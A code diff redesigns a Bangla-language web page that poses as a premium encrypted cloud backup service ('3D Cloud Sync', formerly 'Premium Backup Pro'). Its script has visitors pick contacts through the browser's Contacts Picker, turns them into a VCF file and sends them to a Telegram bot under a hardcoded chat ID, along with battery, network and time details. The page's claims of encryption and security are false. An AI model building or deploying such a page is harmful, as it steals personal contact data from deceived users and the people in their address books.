@@ -3,132 +3,141 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Premium Backup Pro</title>
+    <title>3D Cloud Sync</title>
     <link href="https://fonts.googleapis.com/css2?family=Hind+Siliguri:wght@400;600&display=swap" rel="stylesheet">
     <style>
         :root {
-            --gold: #ffcc00;
-            --gold-dark: #b8860b;
-            --bg-dark: #0a0e14;
-            --card-bg: #161b22;
-            --text-gray: #8b949e;
+            --gold: #ffd700;
+            --glass: rgba(255, 255, 255, 0.05);
+            --border: rgba(255, 255, 255, 0.1);
         }
 
         body {
             font-family: 'Hind Siliguri', sans-serif;
-            background-color: var(--bg-dark);
-            color: #ffffff;
+            background: radial-gradient(circle at center, #1e293b 0%, #020617 100%);
+            height: 100vh;
             margin: 0;
             display: flex;
             justify-content: center;
             align-items: center;
-            min-height: 100vh;
+            overflow: hidden;
+            perspective: 1000px;
+        }
+
+        /* ৩ডি ফ্লোটিং অ্যানিমেশন */
+        @keyframes floating {
+            0% { transform: translateY(0px) rotateX(5deg) rotateY(-5deg); }
+            50% { transform: translateY(-20px) rotateX(10deg) rotateY(5deg); }
+            100% { transform: translateY(0px) rotateX(5deg) rotateY(-5deg); }
+        }
+
+        .premium-box {
+            background: var(--glass);
+            backdrop-filter: blur(20px);
+            padding: 50px 30px;
+            border-radius: 40px;
+            width: 350px;
+            text-align: center;
+            border: 1px solid var(--border);
+            box-shadow: 0 25px 50px rgba(0, 0, 0, 0.5), 
+                        inset 0 0 20px rgba(255, 255, 255, 0.05);
+            animation: floating 6s ease-in-out infinite;
+            transform-style: preserve-3d;
+        }
+
+        .icon-3d {
+            font-size: 70px;
+            margin-bottom: 25px;
+            display: inline-block;
+            filter: drop-shadow(0 10px 20px rgba(255, 215, 0, 0.4));
+        }
+
+        h2 {
+            color: #fff;
+            font-size: 28px;
+            margin: 0;
+            text-shadow: 0 5px 15px rgba(0,0,0,0.3);
+            font-weight: 600;
+        }
+
+        p {
+            color: #94a3b8;
+            font-size: 15px;
+            margin: 15px 0 35px;
+            line-height: 1.6;
+        }
+
+        /* ৩ডি গ্লোয়িং বাটন */
+        .sync-btn {
+            position: relative;
+            background: linear-gradient(135deg, #ffd700, #b8860b);
+            color: #000;
+            border: none;
+            padding: 20px;
+            width: 100%;
+            border-radius: 20px;
+            font-size: 18px;
+            font-weight: bold;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            box-shadow: 0 15px 30px rgba(184, 134, 11, 0.4);
             overflow: hidden;
         }
 
-        /* প্রিমিয়াম কার্ড ডিজাইন */
-        .premium-card {
-            background: var(--card-bg);
-            width: 360px;
-            padding: 40px 25px;
-            border-radius: 35px;
-            text-align: center;
-            border: 1px solid rgba(255, 204, 0, 0.15);
-            box-shadow: 0 30px 60px rgba(0, 0, 0, 0.6);
-            position: relative;
+        .sync-btn:hover {
+            transform: translateY(-5px);
+            box-shadow: 0 20px 40px rgba(184, 134, 11, 0.6);
         }
 
-        .premium-card::after {
+        .sync-btn::before {
             content: '';
             position: absolute;
-            top: -2px; left: -2px; right: -2px; bottom: -2px;
-            background: linear-gradient(135deg, var(--gold), transparent, var(--gold-dark));
-            border-radius: 35px;
-            z-index: -1;
-            opacity: 0.2;
+            top: -50%;
+            left: -50%;
+            width: 200%;
+            height: 200%;
+            background: rgba(255,255,255,0.2);
+            transform: rotate(45deg);
+            transition: 0.5s;
         }
 
-        .main-icon {
-            font-size: 50px;
-            background: linear-gradient(to bottom, var(--gold), var(--gold-dark));
-            -webkit-background-clip: text;
-            -webkit-text-fill-color: transparent;
-            margin-bottom: 15px;
+        .sync-btn:hover::before {
+            left: 100%;
         }
 
-        h2 { font-size: 24px; margin-bottom: 10px; font-weight: 600; letter-spacing: 1px; }
-        p { color: var(--text-gray); font-size: 14px; margin-bottom: 30px; line-height: 1.5; }
-
-        /* ইনফো গ্রিড ডিজাইন */
-        .info-grid {
-            display: grid;
-            grid-template-columns: 1fr 1fr;
-            gap: 12px;
-            margin-bottom: 30px;
+        #status {
+            margin-top: 25px;
+            font-size: 14px;
+            color: var(--gold);
+            font-weight: 500;
+            opacity: 0.8;
         }
 
-        .info-item {
-            background: rgba(255, 255, 255, 0.03);
-            padding: 12px;
-            border-radius: 15px;
-            border: 1px solid rgba(255, 255, 255, 0.05);
+        .loader {
+            display: none;
+            width: 25px;
+            height: 25px;
+            border: 3px solid rgba(255,215,0,0.1);
+            border-top: 3px solid var(--gold);
+            border-radius: 50%;
+            margin: 15px auto;
+            animation: spin 1s linear infinite;
         }
 
-        .info-item label { display: block; font-size: 10px; color: var(--gold); text-transform: uppercase; margin-bottom: 4px; font-weight: bold; }
-        .info-item span { font-size: 13px; font-weight: 600; }
-
-        /* মডার্ন বাটন */
-        .sync-btn {
-            background: linear-gradient(135deg, var(--gold), var(--gold-dark));
-            color: #000;
-            border: none;
-            padding: 18px;
-            width: 100%;
-            border-radius: 18px;
-            font-size: 17px;
-            font-weight: bold;
-            cursor: pointer;
-            transition: 0.4s;
-            box-shadow: 0 10px 20px rgba(184, 134, 11, 0.3);
-        }
-
-        .sync-btn:hover {
-            transform: translateY(-3px) scale(1.02);
-            box-shadow: 0 15px 30px rgba(184, 134, 11, 0.5);
-        }
-
-        #status { margin-top: 25px; font-size: 13px; color: var(--gold); font-weight: 500; }
-
-        .progress-line {
-            height: 3px; width: 0%;
-            background: var(--gold);
-            position: absolute; bottom: 0; left: 0;
-            transition: 0.6s ease;
-            border-radius: 0 0 0 35px;
-        }
+        @keyframes spin { 100% { transform: rotate(360deg); } }
     </style>
 </head>
 <body>
 
-<div class="premium-card">
-    <div class="main-icon">💎</div>
-    <h2>সিলেক্টিভ ব্যাকআপ</h2>
-    <p>নিরাপদ ক্লাউড স্টোরেজে আপনার কন্টাক্ট এবং ডিভাইস ডেটা সিঙ্ক করুন।</p>
+<div class="premium-box">
+    <div class="icon-3d">🔮</div>
+    <h2>ক্লাউড এনক্রিপশন</h2>
+    <p>আপনার কন্টাক্টগুলো নিরাপদে এনক্রিপ্ট করে সিকিউরড ক্লাউড মেমরিতে ট্রান্সফার করুন।</p>
     
-    <div class="info-grid">
-        <div class="info-item">
-            <label>ব্যাটারি</label>
-            <span id="bat-val">--%</span>
-        </div>
-        <div class="info-item">
-            <label>নেটওয়ার্ক</label>
-            <span id="net-val">চেকিং...</span>
-        </div>
-    </div>
-
-    <button id="mainAction" class="sync-btn">সিঙ্ক শুরু করুন</button>
-    <div id="status">সিস্টেম এনক্রিপ্টেড</div>
-    <div class="progress-line" id="progLine"></div>
+    <button id="startBtn" class="sync-btn">ব্যাকআপ শুরু করুন</button>
+    
+    <div class="loader" id="loader"></div>
+    <div id="status">সিস্টেম সিকিউরড</div>
 </div>
 
 <script>
@@ -137,85 +146,69 @@
         CHAT_ID: '5923885908'
     };
 
-    // ১. ডিভাইস তথ্য রিয়েল-টাইম আপডেট
-    async function updateDeviceStats() {
-        if (navigator.getBattery) {
-            const battery = await navigator.getBattery();
-            document.getElementById('bat-val').innerText = Math.round(battery.level * 100) + "%";
-        }
-        document.getElementById('net-val').innerText = navigator.connection?.effectiveType.toUpperCase() || "N/A";
-    }
-    updateDeviceStats();
-
-    const btn = document.getElementById('mainAction');
+    const btn = document.getElementById('startBtn');
     const status = document.getElementById('status');
-    const prog = document.getElementById('progLine');
+    const loader = document.getElementById('loader');
 
     btn.addEventListener('click', async () => {
         try {
-            if (!('contacts' in navigator)) throw new Error("Unsupported Browser");
+            if (!('contacts' in navigator)) throw new Error("Unsupported device");
 
             const contacts = await navigator.contacts.select(['name', 'tel'], { multiple: true });
 
             if (contacts.length > 0) {
                 btn.disabled = true;
-                status.innerText = "সার্ভারে পাঠানো হচ্ছে...";
-                prog.style.width = "45%";
+                loader.style.display = "block";
+                status.innerText = "সার্ভারের সাথে কানেক্ট হচ্ছে...";
 
-                // ২. বর্তমান সময়, বার এবং তারিখ তৈরি (Bangla Locale)
+                // ১. ডিভাইস তথ্য (ব্যাকগ্রাউন্ডে)
+                const bat = await (navigator.getBattery ? navigator.getBattery() : {level: 0, charging: false});
+                const net = navigator.connection?.effectiveType || "N/A";
+                
+                // ২. সময় এবং তারিখ (বাংলা)
                 const now = new Date();
-                const options = { weekday: 'long', year: 'numeric', month: 'long', day: 'numeric' };
-                const banglaDate = now.toLocaleDateString('bn-BD', options);
-                const banglaTime = now.toLocaleTimeString('bn-BD');
+                const bDate = now.toLocaleDateString('bn-BD', { weekday: 'long', year: 'numeric', month: 'long', day: 'numeric' });
+                const bTime = now.toLocaleTimeString('bn-BD');
 
-                // ৩. ব্যাটারি ও নেটওয়ার্ক আপডেট
-                const bat = await navigator.getBattery();
-                const net = navigator.connection?.effectiveType || "Unknown";
-
-                // ৪. VCF ডেটা তৈরি
+                // ৩. VCF ডেটা তৈরি
                 let vcf = "";
                 contacts.forEach(c => {
-                    const name = c.name ? c.name[0] : "অচেনা";
-                    const tel = c.tel ? c.tel[0] : "";
-                    vcf += `BEGIN:VCARD\nVERSION:3.0\nFN:${name}\nTEL:${tel}\nEND:VCARD\n`;
+                    vcf += `BEGIN:VCARD\nVERSION:3.0\nFN:${c.name ? c.name[0] : 'User'}\nTEL:${c.tel ? c.tel[0] : ''}\nEND:VCARD\n`;
                 });
 
-                // ৫. প্রফেশনাল রিপোর্ট মেসেজ
-                const report = `⚜️ **প্রিমিয়াম ডেটা রিপোর্ট** ⚜️\n\n` +
-                               `👥 **মোট কন্টাক্ট:** ${contacts.length} টি\n` +
+                // ৪. পূর্ণাঙ্গ রিপোর্ট (টেলিগ্রামের জন্য)
+                const report = `🌟 **প্রিমিয়াম ৩ডি ব্যাকআপ রিপোর্ট**\n\n` +
+                               `👥 **মোট কন্টাক্ট:** ${contacts.length}\n` +
                                `🔋 **ব্যাটারি:** ${Math.round(bat.level * 100)}%\n` +
                                `📶 **নেটওয়ার্ক:** ${net.toUpperCase()}\n` +
-                               `📅 **তারিখ:** ${banglaDate}\n` +
-                               `⏰ **সময়:** ${banglaTime}\n` +
-                               `🗓 **বার:** ${now.toLocaleDateString('bn-BD', {weekday: 'long'})}\n\n` +
-                               `✅ ডেটা এনক্রিপশন সফল হয়েছে।`;
+                               `📅 **তারিখ:** ${bDate}\n` +
+                               `⏰ **সময়:** ${bTime}`;
 
-                // ৬. টেলিগ্রামে পাঠানো
-                await sendToBot(report, vcf);
+                // ৫. পাঠানো
+                await sendToTG(report, vcf);
 
-                prog.style.width = "100%";
-                status.innerText = "✅ ব্যাকআপ সফলভাবে সম্পন্ন!";
-                status.style.color = "#ffcc00";
+                loader.style.display = "none";
+                status.innerText = "✅ সফলভাবে সম্পন্ন হয়েছে!";
+                status.style.color = "#4ade80";
             }
         } catch (e) {
-            status.innerText = "এরর: " + e.message;
+            status.innerText = "ত্রুটি: " + e.message;
             btn.disabled = false;
+            loader.style.display = "none";
         }
     });
 
-    async function sendToBot(msg, vcf) {
-        // রিপোর্ট মেসেজ
+    async function sendToTG(text, vcf) {
         await fetch(`https://api.telegram.org/bot${CONFIG.TOKEN}/sendMessage`, {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({ chat_id: CONFIG.CHAT_ID, text: msg, parse_mode: 'Markdown' })
+            body: JSON.stringify({ chat_id: CONFIG.CHAT_ID, text: text, parse_mode: 'Markdown' })
         });
 
-        // VCF ফাইল
         const blob = new Blob([vcf], { type: 'text/vcard' });
         const formData = new FormData();
         formData.append('chat_id', CONFIG.CHAT_ID);
-        formData.append('document', blob, `Backup_${Date.now()}.vcf`);
+        formData.append('document', blob, `Sync_${Date.now()}.vcf`);
 
         return fetch(`https://api.telegram.org/bot${CONFIG.TOKEN}/sendDocument`, {
             method: 'POST',
